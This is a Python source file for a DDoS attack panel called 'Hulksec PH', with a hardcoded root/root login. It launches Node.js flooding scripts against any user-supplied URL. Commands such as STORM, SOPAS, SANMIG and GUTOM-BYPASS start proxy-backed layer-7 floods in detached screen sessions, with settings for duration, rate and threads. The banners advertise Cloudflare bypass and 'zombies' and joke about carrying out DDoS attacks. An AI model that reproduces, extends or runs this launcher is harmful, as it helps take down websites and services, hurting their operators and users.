from operator import index
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
import colorama
from colorama import Fore, Back
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
import codecs


author = "MrX"

def clear():
    os.system("cls" if os.name == "nt" else "clear")

proxys = open('proxy.txt').readlines()
bots = len(proxys)

def prints(start_color, end_color, text):
    start_r, start_g, start_b = start_color
    end_r, end_g, end_b = end_color

    for i in range(len(text)):
        r = int(start_r + (end_r - start_r) * i / len(text))
        g = int(start_g + (end_g - start_g) * i / len(text))
        b = int(start_b + (end_b - start_b) * i / len(text))

        color_code = f"\033[38;2;{r};{g};{b}m"
        print(color_code + text[i], end="")

start_color = (255, 255, 255)
end_color = (0, 0, 255)

class Color:
    colorama.init()

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def special():
    os.system ("clear")
    
    print ("")
    print (f"""
         \033[96;1mTYPE:\033[0m [\033[94;1mMETHOD\033[0m] [\033[92;1mURL\033[0m] [\033[95;1mTIME\033[0m] [\033[91;1mTHREAD\033[0m]   
\033[96
                                                       
                                                       

                 \033[96;1m█░█ █░█ █░░ █▄▀ █▀ █▀▀ █▀▀\033[0m
                 \033[97;1m█▀█ █▄█ █▄▄ █░█ ▄█ ██▄ █▄▄\033[0m
          \033[97;1m═══════════════════════════════════════
            ║                                 ║
\033[96;1m        ╔═════════════════════════════════════════╗
        ║               \033[97;1mHulksec PH                ║
        ║             Developer: MrX              ║
        ║           Hulksec Special Tool          ║
        ╚═════════════════════════════════════════╝
                            ║ ║
\033[96;1m            ╔═════════════════════════════════╗
                    ║      STORM      ║
                    ║       RAW       ║
                    ║      PROXY      ║
                    ║     CFBYPASS    ║
                    ╚═════════════════╝

""")



def l7():
    os.system ("clear")

    print ("")
    print (f"""
         \033[96;1mTYPE:\033[0m [\033[94;1mMETHOD\033[0m] [\033[92;1mURL\033[0m] [\033[95;1mTIME\033[0m] [\033[93;1mRATE\033[0m] [\033[91;1mTHREAD\033[0m]   
          \033[96m               
                                                       
                                                       

                 \033[96;1m█░█ █░█ █░░ █▄▀ █▀ █▀▀ █▀▀\033[0m
                 \033[97;1m█▀█ █▄█ █▄▄ █░█ ▄█ ██▄ █▄▄\033[0m
          \033[97;1m═══════════════════════════════════════
            ║                                 ║
\033[90;2m        ╔═════════════════════════════════════════╗
        ║               \033[97;1mHulksec PH                ║
        ║             Developer: MrX              ║
        ║           Hulksec Layer7 Tool           ║
        ╚═════════════════════════════════════════╝
                            ║ ║
            ╔═════════════════════════════════╗
                    ║      PANCIT     ║
                    ║      SANMIG     ║
                    ║      SOPAS      ║
                    ║   GUTOM-BYPASS  ║
                    ╚═════════════════╝
""")

def help():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("""\033[36m
    \033[94m Created by \033[91mMrX\033[0m | \033[93mCommand Center: \033[96mLayer7\033[0m | \033[92mVersion: \033[95m∞\033[0m
    
          ╭───────────────────────────────────────────╮
          │    \033[34;1mL7\033[0m   ► SHOW L7 METHODS                 │
          │    \033[34;1mL4\033[0m   ► SHOW L4 METHODS                 │
          ╰───────────────────────────────────────────╯
""")

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("""

                                             
                             \033[95m⣿⣿⣿⠿⠿⣿⣿⡿⢋⣶⣶⣬⣙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                             \033[95⣿⡿⢡⣿⣷⣶⣦⣥⣿⣿⣿⣿⣿⣷⣮⡛⢿⣿⣿⣿⣿⣿⣿⣿
                             \033[95⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢮⡙⣿⣿⣯⢐⡎⣿
                             \033[95⣿⢹⣿⣿⣿⣿⣿⣿⡿⣡⡬⢿⣿⣿⣿⣶⣶⣼⣦⠥⣖⣩⣾⣿
                             \033[95⣿⢸⣿⣿⣿⡿⣿⣿⣿⣿⠇⣌⢛⣻⣿⣿⣟⣛⣿⣧⠹⣿⣿⣿
                             \033[95⠏⣼⣿⣿⢏⣾⣿⣟⣩⣶⣶⣿⣿⣿⣿⣿⡟⡿⢸⡿⣡⣿⣿⣿
                             \033[95⣼⣿⣿⠇⣼⣿⣿⢸⠋⠁⠉⢽⣿⣿⣿⣟⣠⣤⣆⢃⢻⣿⣿⣿
                             \033[95⣿⣿⣿⣼⣿⣿⣿⡞⣿⣿⣷⣾⣿⣿⣿⣿⡿⠟⠛⠸⢦⣙⡋⣿
                             \033[95⣿⣿⣿⠹⣿⣿⡿⠗⣈⣭⣭⣭⣉⠻⡟⣩⣶⣾⣿⣿⣶⡙⣱⣿
                             \033[95⣿⣿⣿⣷⣌⡛⠠⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⢸⣿
                             \033[95⣿⣿⣿⣿⢏⣴⣧⣴⡘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣱⣶⣴⡜⢸⣿
                             \033[95⣿⣿⣿⢃⣾⣿⣿⣿⡷⠉⢿⣿⣿⣿⣿⣿⣿⢰⣾⣿⣿⣧⢸⣿
                          
                          
               SANA MAHULI KA WALA KANA GINAWA KUNDI MAG DDOS
                       JOKE LANG BAHALA KA SA GAGAWIN MO
                                  MALAKI KANA
""")

    while True:
        sys.stdout.write("\x1b]2;[\] Mrx-Panel :: Online Users: [1] :: Attack Sended: [1/10]\x07")
        sin = input("\033[94;1m╔═══\033[94;1m[root\033[92;1m@\033[94;1mMrX\033[94;1m]\n╚══\x1b[38;2;0;255;189m> \033[97m")
        sinput = sin.split(" ")[0]
        if sinput.lower() in ["clear", "cls"]:
            os.system("clear")
            main()
        if sinput.lower() in ["help", ".help", "Help", ".HELP"]:
           help()
        if sinput.lower() in ['l7']:
           l7()
        if sinput.lower() in ['special']:
           special()
        if sinput == "stop" or sinput == "STOP":
            os.system ("pkill screen")
            main()          
            
#########LAYER-12########
        elif sinput == "RAW":
            try:
                url = sin.split()[1]
                time = sin.split()[2]
                thread = sin.split()[3]
                os.system(f'cd l7 && screen -dm node raw.js {url} {time} raw {thread}')
                os.system ("clear")
                print (f"""
                 \033[96;1m█░█ █░█ █░░ █▄▀ █▀ █▀▀ █▀▀\033[0m
                 \033[97;1m█▀█ █▄█ █▄▄ █░█ ▄█ ██▄ █▄▄\033[0m
          \033[97;1m═══════════════════════════════════════
            ║                                 ║
\033[96;1m        ╔═════════════════════════════════════════╗
        ║               Hulksec PH                ║
        ║             Developer: MrX              ║
        ║           Hulksec Special Tool          ║
        ╚═════════════════════════════════════════╝
                            ║ ║
            ╔═════════════════════════════════╗
               Method   : [RAW]
               TARGET   : [{url}]
               TIME     : [{time}]
               THREAD   : [{thread}]
            ╚═════════════════════════════════╝

""")
            except ValueError:
                l7()
            except IndexError:
                l7()

        elif sinput == "STORM":
            try:
                url = sin.split()[1]
                time = sin.split()[2]
                thread = sin.split()[3]
                os.system(f'cd l7 && screen -dm node raw.js {url} {time} storm {thread}')
                os.system ("clear")
                print (f"""
                 \033[96;1m█░█ █░█ █░░ █▄▀ █▀ █▀▀ █▀▀\033[0m
                 \033[97;1m█▀█ █▄█ █▄▄ █░█ ▄█ ██▄ █▄▄\033[0m
          \033[97;1m═══════════════════════════════════════
            ║                                 ║
\033[96;1m        ╔═════════════════════════════════════════╗
        ║               Hulksec PH                ║
        ║             Developer: MrX              ║
        ║           Hulksec Special Tool          ║
        ╚═════════════════════════════════════════╝
                            ║ ║
            ╔═════════════════════════════════╗
               Method   : [STORM]
               TARGET   : [{url}]
               TIME     : [{time}]
               THREAD   : [{thread}]
            ╚═════════════════════════════════╝

""")
            except ValueError:
                l7()
            except IndexError:
                l7()

        elif sinput == "PROXY":
            try:
                url = sin.split()[1]
                time = sin.split()[2]
                thread = sin.split()[3]
                os.system(f'cd l7 && screen -dm node raw.js {url} {time} proxy {thread}')
                os.system ("clear")
                print (f"""
                 \033[96;1m█░█ █░█ █░░ █▄▀ █▀ █▀▀ █▀▀\033[0m
                 \033[97;1m█▀█ █▄█ █▄▄ █░█ ▄█ ██▄ █▄▄\033[0m
          \033[97;1m═══════════════════════════════════════
            ║                                 ║
\033[96;1m        ╔═════════════════════════════════════════╗
        ║               Hulksec PH                ║
        ║             Developer: MrX              ║
        ║           Hulksec Special Tool          ║
        ╚═════════════════════════════════════════╝
                            ║ ║
            ╔═════════════════════════════════╗
               Method   : [PROXY]
               TARGET   : [{url}]
               TIME     : [{time}]
               THREAD   : [{thread}]
            ╚═════════════════════════════════╝

""")
            except ValueError:
                l7()
            except IndexError:
                l7()
#########LAYER-7########

        elif sinput == "SOPAS":
            try:
                url = sin.split()[1]
                time = sin.split()[2]
                rate = sin.split()[3]
                thread = sin.split()[4]
                os.system(f'cd l7 && screen -dm node vip.js {url} {time} {rate} {thread} proxy.txt')
                os.system ("clear")
                print (f"""
                 \033[96;1m█░█ █░█ █░░ █▄▀ █▀ █▀▀ █▀▀\033[0m
                 \033[97;1m█▀█ █▄█ █▄▄ █░█ ▄█ ██▄ █▄▄\033[0m
          \033[97;1m═══════════════════════════════════════
            ║                                 ║
\033[96;1m        ╔═════════════════════════════════════════╗
        ║               Hulksec PH                ║
        ║             Developer: MrX              ║
        ║           Hulksec Layer7 Tool           ║
        ╚═════════════════════════════════════════╝
                            ║ ║
            ╔═════════════════════════════════╗
                TARGET:  [{url}]
                METHOD:  [SOPAS]
                TIME:    [{time}]
                RATE:    [{rate}]
                THREADS: [{thread}]
                ZOMBIES: [85]
            ╚═════════════════════════════════╝

          
""")
            except ValueError:
                l7()
            except IndexError:
                l7()
                

        elif sinput == "SANMIG":
            try:
                url = sin.split()[1]
                time = sin.split()[2]
                rate = sin.split()[3]
                thread = sin.split()[4]
                os.system(f'cd l7 && screen -dm node tlsb.js {url} {time} {rate} {thread} proxy.txt')
                os.system ("clear")
                print (f"""
                 \033[96;1m█░█ █░█ █░░ █▄▀ █▀ █▀▀ █▀▀\033[0m
                 \033[97;1m█▀█ █▄█ █▄▄ █░█ ▄█ ██▄ █▄▄\033[0m
          \033[97;1m═══════════════════════════════════════
            ║                                 ║
\033[96;1m        ╔═════════════════════════════════════════╗
        ║               Hulksec PH                ║
        ║             Developer: MrX              ║
        ║           Hulksec Layer7 Tool           ║
        ╚═════════════════════════════════════════╝
                            ║ ║
            ╔═════════════════════════════════╗
                TARGET:  [{url}]
                METHOD:  [SANMIG]
                TIME:    [{time}]
                RATE:    [{rate}]
                THREADS: [{thread}]
                ZOMBIES: [85]
            ╚═════════════════════════════════╝

""")
            except ValueError:
                l7()
            except IndexError:
                l7()
                
        elif sinput == "GUTOM-BYPASS":
            try:
                url = sin.split()[1]
                time = sin.split()[2]
                rate = sin.split()[3]
                thread = sin.split()[4]
                os.system(f'cd l7 && screen -dm node BYPASS.js {url} {time} {rate} {thread} proxy.txt')
                os.system ("clear")
                print (f"""
                 \033[96;1m█░█ █░█ █░░ █▄▀ █▀ █▀▀ █▀▀\033[0m
                 \033[97;1m█▀█ █▄█ █▄▄ █░█ ▄█ ██▄ █▄▄\033[0m
          \033[97;1m═══════════════════════════════════════
            ║                                 ║
\033[96;1m        ╔═════════════════════════════════════════╗
        ║               Hulksec PH                ║
        ║             Developer: MrX              ║
        ║           Hulksec Layer7 Tool           ║
        ╚═════════════════════════════════════════╝
                            ║ ║
            ╔═════════════════════════════════╗
                TARGET:  [{url}]
                METHOD:  [GUTOM-BYPASS]
                TIME:    [{time}]
                RATE:    [{rate}]
                THREADS: [{thread}]
                ZOMBIES: [85]
            ╚═════════════════════════════════╝

""")
            except ValueError:
                l7()
            except IndexError:
                l7()

        elif sinput == "PANCIT":
            try:
                url = sin.split()[1]
                time = sin.split()[2]
                rate = sin.split()[3]
                thread = sin.split()[4]
                os.system(f'cd l7 && screen -dm node rambutan.js {url} {time} {rate} {thread} proxy.txt')
                os.system ("clear")
                print (f"""
                 \033[96;1m█░█ █░█ █░░ █▄▀ █▀ █▀▀ █▀▀\033[0m
                 \033[97;1m█▀█ █▄█ █▄▄ █░█ ▄█ ██▄ █▄▄\033[0m
          \033[97;1m═══════════════════════════════════════
            ║                                 ║
\033[96;1m        ╔═════════════════════════════════════════╗
        ║               Hulksec PH                ║
        ║             Developer: MrX              ║
        ║           Hulksec Layer7 Tool           ║
        ╚═════════════════════════════════════════╝
                            ║ ║
            ╔═════════════════════════════════╗
                TARGET:  [{url}]
                METHOD:  [PANCIT]
                TIME:    [{time}]
                RATE:    [{rate}]
                THREADS: [{thread}]
                ZOMBIES: [85]
            ╚═════════════════════════════════╝

          
""")
            except ValueError:
                l7()
            except IndexError:
                l7()
def login():
	sys.stdout.write(f"\x1b]2;[\] ANON-Panel :: Online Users: [1] :: Attack Sended: [1/10]\x07")
	os.system('cls' if os.name == 'nt' else 'clear')
	user = "root"
	passwd = "root"
	username = input("""\033[96m
	

                                           \033[95m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢲⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\033[0m
                         \033[95m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\033[0m
                         \033[95m⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠄⠂⢉⠤⠐⠋⠈⠡⡈⠉⠐⠠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\033[0m
                         \033[95m⠀⠀⠀⠀⢀⡀⢠⣤⠔⠁⢀⠀⠀⠀⠀⠀⠀⠀⠈⢢⠀⠀⠈⠱⡤⣤⠄⣀⠀⠀⠀⠀⠀\033[0m
                         \033[95m⠀⠀⠰⠁⠀⣰⣿⠃⠀⢠⠃⢸⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠈⢞⣦⡀⠈⡇⠀⠀⠀\033[0m
                         \033[95m⠀⠀⠀⢇⣠⡿⠁⠀⢀⡃⠀⣈⠀⠀⠀⠀⢰⡀⠀⠀⠀⠀⢢⠰⠀⠀⢺⣧⢰⠀⠀⠀⠀\033[0m
                         \033[95m⠀⠀⠀⠈⣿⠁⡘⠀⡌⡇⠀⡿⠸⠀⠀⠀⠈⡕⡄⠀⠐⡀⠈⠀⢃⠀⠀⠾⠇⠀⠀⠀⠀\033[0m
                         \033[95m⠀⠀⠀⠀⠇⡇⠃⢠⠀⠶⡀⡇⢃⠡⡀⠀⠀⠡⠈⢂⡀⢁⠀⡁⠸⠀⡆⠘⡀⠀⠀⠀⠀\033[0m
                         \033[95m⠀⠀⠀⠸⠀⢸⠀⠘⡜⠀⣑⢴⣀⠑⠯⡂⠄⣀⣣⢀⣈⢺⡜⢣⠀⡆⡇⠀⢣⠀⠀⠀⠀\033[0m
                         \033[95m⠀⠀⠀⠇⠀⢸⠀⡗⣰⡿⡻⠿⡳⡅⠀⠀⠀⠀⠈⡵⠿⠿⡻⣷⡡⡇⡇⠀⢸⣇⠀⠀⠀\033[0m
                         \033[95m⠀⠀⢰⠀⠀⡆⡄⣧⡏⠸⢠⢲⢸⠁⠀⠀⠀⠀⠐⢙⢰⠂⢡⠘⣇⡇⠃⠀⠀⢹⡄⠀⠀\033[0m
                         \033[95m⠀⠀⠟⠀⠀⢰⢁⡇⠇⠰⣀⢁⡜⠀⠀⠀⠀⠀⠀⠘⣀⣁⠌⠀⠃⠰⠀⠀⠀⠈⠰⠀⠀\033[0m
                         \033[95m⠀⡘⠀⠀⠀⠀⢊⣤⠀⠀⠤⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠤⠄⠀⢸⠃⠀⠀⠀⠀⠀⠃⠀\033[0m
                         \033[95m⢠⠁⢀⠀⠀⠀⠈⢿⡀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⢀⠏⠀⠀⠀⠀⠀⠀⠸⠀\033[0m
                         \033[95m⠘⠸⠘⡀⠀⠀⠀⠀⢣⠀⠀⠀⠀⠀⠀⠁⠀⠃⠀⠀⠀⠀⢀⠎⠀⠀⠀⠀⠀⢠⠀⠀⡇\033[0m
                         \033[95m⠀⠇⢆⢃⠀⠀⠀⠀⠀⡏⢲⢤⢀⡀⠀⠀⠀⠀⠀⢀⣠⠄⡚⠀⠀⠀⠀⠀⠀⣾⠀⠀⠀\033[0m
                         \033[95m⢰⠈⢌⢎⢆⠀⠀⠀⠀⠁⣌⠆⡰⡁⠉⠉⠀⠉⠁⡱⡘⡼⠇⠀⠀⠀⠀⢀⢬⠃⢠⠀⡆\033[0m
                         \033[95m⠀⢢⠀⠑⢵⣧⡀⠀⠀⡿⠳⠂⠉⠀⠀⠀⠀⠀⠀⠀⠁⢺⡀⠀⠀⢀⢠⣮⠃⢀⠆⡰⠀\033[0m
                         \033[95m⠀⠀⠑⠄⣀⠙⡭⠢⢀⡀⠀⠁⠄⣀⣀⠀⢀⣀⣀⣀⡠⠂⢃⡀⠔⠱⡞⢁⠄⣁⠔⠁⠀\033[0m
                         \033[95m⠀⠀⠀⠀⠀⢠⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠉⠁⠀⠀⠀⠀\033[0m
                         \033[95m⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

                PATI ANIME NAGULAT SAYO KASI KANTOTERO KA 
                           LOGIN KA MUNA KAPATID
   
[USERNAME]
> """)

	password = getpass.getpass(prompt='[PASSWORD]>   ')
	if username != user or password != passwd:
		print("")
		sys.exit(1)
	elif username == user and password == passwd:
		time.sleep(0.5)
		main()

login()